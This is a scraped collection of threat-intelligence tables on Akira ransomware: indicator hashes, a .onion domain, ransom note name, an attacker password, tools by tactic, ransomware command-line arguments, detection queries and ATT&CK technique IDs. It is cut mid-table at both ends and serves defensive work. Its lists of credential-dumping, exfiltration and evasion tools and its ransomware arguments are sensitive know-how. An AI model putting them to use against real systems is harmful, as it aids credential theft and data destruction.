--><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">stack_string</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">Aug 9, 2023, 9:59:16 AM</span><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="ng-star-inserted">34</span><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><!-- --></tr><!-- --><!-- --><!-- --><tr _ngcontent-kpx-c167="" class="show-row no-footer ng-star-inserted"><!-- --><td _ngcontent-kpx-c167="" class="ng-star-inserted"><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">FileHash-SHA256</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="ioc-text ng-star-inserted"><span _ngcontent-kpx-c167="" class="nowrap ellipsis" title="9ca333b2e88ab35f608e447b0e3b821a6e04c4b0c76545177890fb16adcab163">9ca333b2e88ab35f608e447b0e3b821a6e04c4b0c76545177890fb16adcab163</span></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">stack_string</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">Aug 9, 2023, 9:59:16 AM</span><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="ng-star-inserted">38</span><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><!-- --></tr><!-- --><!-- --><!-- --><tr _ngcontent-kpx-c167="" class="show-row no-footer ng-star-inserted"><!-- --><td _ngcontent-kpx-c167="" class="ng-star-inserted"><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">FileHash-SHA256</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="ioc-text ng-star-inserted"><span _ngcontent-kpx-c167="" class="nowrap ellipsis" title="d0510e1d89640c9650782e882fe3b9afba00303b126ec38fdc5f1c1484341959">d0510e1d89640c9650782e882fe3b9afba00303b126ec38fdc5f1c1484341959</span></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">stack_string</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">Aug 9, 2023, 9:59:16 AM</span><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="ng-star-inserted">38</span><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><!-- --></tr><!-- --><!-- --><!-- --><tr _ngcontent-kpx-c167="" class="show-row no-footer ng-star-inserted"><!-- --><td _ngcontent-kpx-c167="" class="ng-star-inserted"><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">domain</span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="ioc-text ng-star-inserted"><span _ngcontent-kpx-c167="" class="nowrap ellipsis" title="akiral2iz6a7qgd3ayp3l6yub7xx2uep76idk3u2kollpj5z3z636bad.onion">akiral2iz6a7qgd3ayp3l6yub7xx2uep76idk3u2kollpj5z3z636bad.onion</span></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted"></span><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="nowrap ellipsis ng-star-inserted">Aug 9, 2023, 9:59:16 AM</span><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="text-center hidden-xs hidden-md hidden-sm ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><span _ngcontent-kpx-c167="" class="ng-star-inserted">60</span><!-- --><!-- --><!-- --></td><!-- --><td _ngcontent-kpx-c167="" class="hidden-xs ng-star-inserted"><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --><!-- --></td><!-- --><!-- --></tr><!-- --><!-- --><!-- --><!-- --></tbody><!-- --></table><br><br><p>Source: <a href='https://otx.alienvault.com/pulse/64d36373ed245891155e0c25'>https://otx.alienvault.com/pulse/64d36373ed245891155e0c25</a></p><br><p>No tables found on https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2024-02-27-IOCs-for-Akira-Ransomware.txt</p><table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>WIN-JGRMF8L11HO</code></td>
+<td>threat actor’s workstation name</td>
+</tr>
+<tr>
+<td><code>akira</code></td>
+<td>Encrypted file extension</td>
+</tr>
+<tr>
+<td><code>akira_readme.txt</code></td>
+<td>Akira ransom note file name</td>
+</tr>
+<tr>
+<td><code>Noface66Nocase!</code></td>
+<td>Password observed used during new account creation, and when account password has been changed</td>
+</tr>
+<tr>
+<td><code>3b7fc61649badd73986a86d39124b69aa2c7b6ecdb1d448137080579dc4990f2</code></td>
+<td>SHA256 hash for one instance of <code>w.exe</code></td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://www.huntress.com/blog/akira-ransomware-indicators'>https://www.huntress.com/blog/akira-ransomware-indicators</a></p><br><table class="has-fixed-layout"><tbody><tr><td rowspan="2">Initial Access</td><td>Compromised credentials, likely purchased from initial access brokers for entry points that did not use MFA.</td></tr><tr><td>Exploiting vulnerabilities such as CVE-2021-21972, CVE-2019-6693, CVE-2022-40684 and CVE-2023-20269</td></tr></tbody></table><br><br><p>Source: <a href='https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware'>https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware</a></p><br><table class="has-fixed-layout"><tbody><tr><td rowspan="8">Discovery</td><td>Get-ADUser, Get-ADComputer</td></tr><tr><td>AdFind</td></tr><tr><td>SoftPerfect Network Scanner (netscan.exe)</td></tr><tr><td>PCHunter</td></tr><tr><td>Advanced IP Scanner</td></tr><tr><td>SharpHound</td></tr><tr><td>MASScan</td></tr><tr><td>reconftw</td></tr></tbody></table><br><br><p>Source: <a href='https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware'>https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware</a></p><br><table class="has-fixed-layout"><tbody><tr><td rowspan="10">Command &amp; Control</td><td>RSAT-AD</td></tr><tr><td>SystemBC</td></tr><tr><td>NetCat</td></tr><tr><td>Anydesk</td></tr><tr><td>Radmin</td></tr><tr><td>Cloudfare Tunnel</td></tr><tr><td>Mobaxterm</td></tr><tr><td>Ngrok</td></tr><tr><td>RustDesk</td></tr><tr><td>SSH</td></tr></tbody></table><br><br><p>Source: <a href='https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware'>https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware</a></p><br><table class="has-fixed-layout"><tbody><tr><td rowspan="3">Persistence</td><td>Scheduled tasks</td></tr><tr><td>Newly created accounts</td></tr><tr><td>Compromised valid accounts</td></tr></tbody></table><br><br><p>Source: <a href='https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware'>https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware</a></p><br><table class="has-fixed-layout"><tbody><tr><td rowspan="4">Credential Access</td><td>Comsvcs.dll dumping lsass</td></tr><tr><td>Mimikatz</td></tr><tr><td>Lazagne</td></tr><tr><td>NTDS dump</td></tr></tbody></table><br><br><p>Source: <a href='https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware'>https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware</a></p><br><table class="has-fixed-layout"><tbody><tr><td rowspan="3">Lateral Movement</td><td>RDP</td></tr><tr><td>Network shares</td></tr><tr><td>Psexec</td></tr></tbody></table><br><br><p>Source: <a href='https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware'>https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware</a></p><br><table class="has-fixed-layout"><tbody><tr><td rowspan="5">Defense Evasion</td><td>Disabling windows defender and adding exclusions.</td></tr><tr><td>Userlist registry modification to hide accounts on login screen.</td></tr><tr><td>DisableRestrictedAdmin registry modification to allow login without credentials.</td></tr><tr><td>Terminator used to perform BYOVD attacks to disable security products.</td></tr><tr><td>Creation of new VM to hide adversary behavior.</td></tr></tbody></table><br><br><p>Source: <a href='https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware'>https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware</a></p><br><table class="has-fixed-layout"><tbody><tr><td rowspan="3">Exfiltration</td><td>WinScp</td></tr><tr><td>FileZilla</td></tr><tr><td>Rclone</td></tr></tbody></table><br><br><p>Source: <a href='https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware'>https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware</a></p><br><table class="has-fixed-layout"><tbody><tr><td rowspan="3">Impact</td><td>Veeam backups deleted</td></tr><tr><td>Shadow copies deleted</td></tr><tr><td>Data encrypted</td></tr></tbody></table><br><br><p>Source: <a href='https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware'>https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware</a></p><br><table class="has-fixed-layout"><tbody><tr><td><strong>Argument</strong></td><td><strong>Description</strong></td></tr><tr><td>–encryption_path, -p</td><td>Targeted path for encryption.</td></tr><tr><td>–share_file, -s</td><td>Targeted network drive for encryption.</td></tr><tr><td>-n, –encryption_percent</td><td>Defines how much of the victim’s files will be encrypted.</td></tr><tr><td>-localonly</td><td>Only target local files.</td></tr><tr><td>-e, –exclude</td><td>Files to exclude from encryption.</td></tr><tr><td>-l</td><td>Display log file.</td></tr></tbody></table><br><br><p>Source: <a href='https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware'>https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware</a></p><br><table class="has-fixed-layout"><tbody><tr><td><strong>Description</strong></td><td><strong>Query</strong></td></tr><tr><td>PowerShell deleting shadow copies.</td><td>mitre.attack.technique.id:”T1490″ and process.name:”PowerShell.exe” and process.arguments:”Win32_Shadowcopy”</td></tr><tr><td>All T1490 tagged events in the last 7 days.</td><td>mitre.attack.technique.id:”T1490″ and event.dateTime:[now-7d .. now-1s]</td></tr><tr><td>All T1486 tagged events in the last 7 days.</td><td>mitre.attack.technique.id:”T1486″ and event.dateTime:[now-7d .. now-1s]</td></tr><tr><td>Remote access tool activity in the last 3 days</td><td>mitre.attack.technique.name:”Remote Access Software” and event.dateTime:[now-3d … now-1s]</td></tr><tr><td>New user creation via net</td><td>process.name:”net.exe” and process.arguments:”user” and process.arguments:[“/dom”,”/add”]</td></tr></tbody></table><br><br><p>Source: <a href='https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware'>https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware</a></p><br><table class="has-fixed-layout"><tbody><tr><td><strong>Technique</strong></td><td><strong>ID</strong></td></tr><tr><td>Exploit Public-Facing Application</td><td>T1190</td></tr><tr><td>External Remote Services</td><td>T1133</td></tr><tr><td>Valid Accounts</td><td>T1078</td></tr><tr><td>File and Directory Discovery</td><td>T1083</td></tr><tr><td>Remote System Discovery</td><td>T1018</td></tr><tr><td>System Information Discovery</td><td>T1082</td></tr><tr><td>Hide Artifacts: Hidden Users</td><td>T1564.002</td></tr><tr><td>Hide Artifacts: Run Virtual Instance</td><td>T1564.006</td></tr><tr><td>Remote Services: Remote Desktop Protocol</td><td>T1021.001</td></tr><tr><td>OS Credential Dumping</td><td>T1003</td></tr><tr><td>Archive Collected Data</td><td>T1560</td></tr><tr><td>Remote Access Software</td><td>T1219</td></tr><tr><td>Automated Exfiltration</td><td>T1020</td></tr><tr><td>Data Encrypted for Impact</td><td>T1486</td></tr><tr><td>Defacement: Internal Defacement</td><td>T1491.001</td></tr></tbody></table><br><br><p>Source: <a href='https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware'>https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware</a></p><br><table class="has-fixed-layout"><tbody><tr><td><strong>Name</strong></td><td><strong>Indicator</strong></td></tr><tr><td>Akira</td><td>e57340a208ac9d95a1f015a5d6d98b94</td></tr><tr><td>Akira</td><td>e8139b0bc60a930586cf3af6fa5ea573</td></tr><tr><td>Akira</td><td>a1f4931992bf05e9bff4b173c15cab15</td></tr><tr><td>Akira</td><td>08bd63480cd313d2e219448ac28f72cd</td></tr><tr><td>Akira</td><td>4aecef9ddc8d07b82a6902b27f051f34</td></tr><tr><td>Akira</td><td>ab9e577334aeb060ac402598098e13b9</td></tr></tbody></table><br><br><p>Source: <a href='https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware'>https://blog.qualys.com/vulnerabilities-threat-research/2024/10/02/threat-brief-understanding-akira-ransomware</a></p><br><p>No tables found on https://www.ic3.gov/media/news/2024/240418.pdf</p><table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none;">
+<tbody>
+<tr>
+<td style="width: 148.6pt; border: solid windowtext 1.0pt; padding: 0in 5.4pt 0in 5.4pt;">
+<p style="text-align: center; margin-right: 0in; margin-left: 0in; font-size: 12pt; font-family: 'Times New Roman', serif;"><span class="hscoswrapper"><b>MITRE ATT&amp;CK Tactic</b></span></p>
+</td>
+<td style="width: 292.8pt; border: solid windowtext 1.0pt; border-left: none; padding: 0in 5.4pt 0in 5.4pt;" valign="top">
+<p style="text-align: center; margin-right: 0in; margin-left: 0in; font-size: 12pt; font-family: 'Times New Roman', serif;"><span class="hscoswrapper"><b>Tools used by Akira Ransomware Affiliates</b></span></p>
+</td>
+</tr>
+<tr>
+<td rowspan="2" style="width: 148.6pt; border: solid windowtext 1.0pt; border-top: none; padding: 0in 5.4pt 0in 5.4pt;" valign="top">
+<p style="text-align: justify; margin-right: 0in; margin-left: 0in; font-size: 12pt; font-family: 'Times New Roman', serif;">Discovery</p>
+</td>
+<td style="width: 292.8pt; border-top: none; border-left: none; border-bottom: solid windowtext 1.0pt; border-right: solid windowtext 1.0pt; padding: 0in 5.4pt 0in 5.4pt;" valign="top">
+<p style="text-align: justify; margin-right: 0in; margin-left: 0in; font-size: 12pt; font-family: 'Times New Roman', serif;"><span class="hscoswrapper">Advanced IP Scanner</span></p>
+</td>
+</tr>
+<tr>
+<td style="width: 292.8pt; border-top: none; border-left: none; border-bottom: solid windowtext 1.0pt; border-right: solid windowtext 1.0pt; padding: 0in 5.4pt 0in 5.4pt;" valign="top">
+<p style="text-align: justify; margin-right: 0in; margin-left: 0in; font-size: 12pt; font-family: 'Times New Roman', serif;">SoftPerfect Network Scanner</p>
+</td>
+</tr>
+<tr>
+<td style="width: 148.6pt; border: solid windowtext 1.0pt; border-top: none; padding: 0in 5.4pt 0in 5.4pt;" valign="top">
+<p style="text-align: justify; margin-right: 0in; margin-left: 0in; font-size: 12pt; font-family: 'Times New Roman', serif;">Credential Access</p>
+</td>
+<td style="width: 292.8pt; border-top: none; border-left: none; border-bottom: solid windowtext 1.0pt; border-right: solid windowtext 1.0pt; padding: 0in 5.4pt 0in 5.4pt;" valign="top">
+<p style="text-align: justify; margin-right: 0in; margin-left: 0in; font-size: 12pt; font-family: 'Times New Roman', serif;">Potentially use of Remote Desktop Protocol (RDP) Brute Force tools (Hydra and similar)</p>
+</td>
+</tr>
+<tr>
+<td style="width: 148.6pt; border: solid windowtext 1.0pt; border-top: none; padding: 0in 5.4pt 0in 5.4pt;" valign="top">
+<p style="text-align: justify; margin-right: 0in; margin-left: 0in; font-size: 12pt; font-family: 'Times New Roman', serif;">Command and Control (C2)</p>
+</td>
+<td style="width: 292.8pt; border-top: none; border-left: none; border-bottom: solid windowtext 1.0pt; border-right: solid windowtext 1.0pt; padding: 0in 5.4pt 0in 5.4pt;" valign="top">
+<p style="text-align: justify; margin-right: 0in; margin-left: 0in; font-size: 12pt; font-family: 'Times New Roman', serif;">AnyDesk</p>
+</td>
+</tr>
+<tr>
+<td rowspan="2" style="width: 148.6pt; border: solid windowtext 1.0pt; border-top: none; padding: 0in 5.4pt 0in 5.4pt;" valign="top">
+<p style="text-align: justify; margin-right: 0in; margin-left: 0in; font-size: 12pt; font-family: 'Times New Roman', serif;">Exfiltration</p>
+</td>
+<td style="width: 292.8pt; border-top: none; border-left: none; border-bottom: solid windowtext 1.0pt; border-right: solid windowtext 1.0pt; padding: 0in 5.4pt 0in 5.4pt;" valign="top">
+<p style="text-align: justify; margin-right: 0in; margin-left: 0in; font-size: 12pt; font-family: 'Times New Roman', serif;"><span class="hscoswrapper">Rclone</span></p>
+</td>
+</tr>
+<tr>
+<td style="width: 292.8pt; border-top: none; border-left: none; border-bottom: solid windowtext 1.0pt; border-right: solid windowtext 1.0pt; padding: 0in 5.4pt 0in 5.4pt;" valign="top">
+<p style="text-align: justify; margin-right: 0in; margin-left: 0in; font-size: 12pt; font-family: 'Times New Roman', serif;"><span class="hscoswrapper">FileZilla</span></p>
+</td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://securityintelligence.com/x-force/spotlight-akira-ransomware-x-force/'>https://securityintelligence.com/x-force/spotlight-akira-ransomware-x-force/</a></p><br><table border="1" cellpadding="0" cellspacing="0" class="ScrollTableNormal" style="width: 615px; border-collapse: collapse; border: none;">
+<thead>
+<tr style="height: 19.0pt;">
+<td style="width: 127.35pt; border: solid #DDDDDD 1.0pt; background: #F0F0F0; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><b><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif; color: black;">Argument</span></b></p>
+</td>
+<td style="width: 333.55pt; border: solid #DDDDDD 1.0pt; border-left: none; background: #F0F0F0; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><b><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif; color: black;">Functionality</span></b></p>
+</td>
+</tr>
+</thead>
+<tbody>
+<tr style="height: 32.45pt;">
+<td style="width: 127.35pt; border: solid #DDDDDD 1.0pt; border-top: none; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">-p, –encryption_path</span></p>
+</td>
+<td style="width: 333.55pt; border-top: none; border-left: none; border-bottom: solid #DDDDDD 1.0pt; border-right: solid #DDDDDD 1.0pt; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">Instructs the ransomware to encrypt a certain directory path recursively.</span></p>
+</td>
+</tr>
+<tr style="height: 33.0pt;">
+<td style="width: 127.35pt; border: solid #DDDDDD 1.0pt; border-top: none; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">-s, –share_file</span></p>
+</td>
+<td style="width: 333.55pt; border-top: none; border-left: none; border-bottom: solid #DDDDDD 1.0pt; border-right: solid #DDDDDD 1.0pt; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">Used to specify additional paths to encrypt.  Appears to be specifically intended for network shares.</span></p>
+</td>
+</tr>
+<tr style="height: 45.85pt;">
+<td style="width: 127.35pt; border: solid #DDDDDD 1.0pt; border-top: none; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">-n, –encryption_percent</span></p>
+</td>
+<td style="width: 333.55pt; border-top: none; border-left: none; border-bottom: solid #DDDDDD 1.0pt; border-right: solid #DDDDDD 1.0pt; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">Used to specify what percentage of each file should be encrypted. (For files under 2MB, the default is 50%.  Larger files use intermittent encryption by default.)</span></p>
+</td>
+</tr>
+<tr style="height: 19.0pt;">
+<td style="width: 127.35pt; border: solid #DDDDDD 1.0pt; border-top: none; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">-localonly</span></p>
+</td>
+<td style="width: 333.55pt; border-top: none; border-left: none; border-bottom: solid #DDDDDD 1.0pt; border-right: solid #DDDDDD 1.0pt; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">Instructs Akira to only encrypt files on the local device.</span></p>
+</td>
+</tr>
+<tr style="height: 32.45pt;">
+<td style="width: 127.35pt; border: solid #DDDDDD 1.0pt; border-top: none; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">-l</span></p>
+</td>
+<td style="width: 333.55pt; border-top: none; border-left: none; border-bottom: solid #DDDDDD 1.0pt; border-right: solid #DDDDDD 1.0pt; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">Instructs Akira to write a list of all connected drives to the log file.  Execution is terminated once complete.</span></p>
+</td>
+</tr>
+<tr style="height: 19.0pt;">
+<td style="width: 127.35pt; border: solid #DDDDDD 1.0pt; border-top: none; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">-remoteonly</span></p>
+</td>
+<td style="width: 333.55pt; border-top: none; border-left: none; border-bottom: solid #DDDDDD 1.0pt; border-right: solid #DDDDDD 1.0pt; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">Parameter has no functionality.</span></p>
+</td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://securityintelligence.com/x-force/spotlight-akira-ransomware-x-force/'>https://securityintelligence.com/x-force/spotlight-akira-ransomware-x-force/</a></p><br><table border="1" cellpadding="0" cellspacing="0" class="ScrollTableNormal" style="width: 588px; border-collapse: collapse; border: none;">
+<tbody>
+<tr style="height: 20.7pt;">
+<td style="width: 102.25pt; border: solid #DDDDDD 1.0pt; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">spoolsv.exe</span></p>
+</td>
+<td style="width: 102.25pt; border: solid #DDDDDD 1.0pt; border-left: none; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">explorer.exe</span></p>
+</td>
+<td style="width: 115.0pt; border: solid #DDDDDD 1.0pt; border-left: none; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
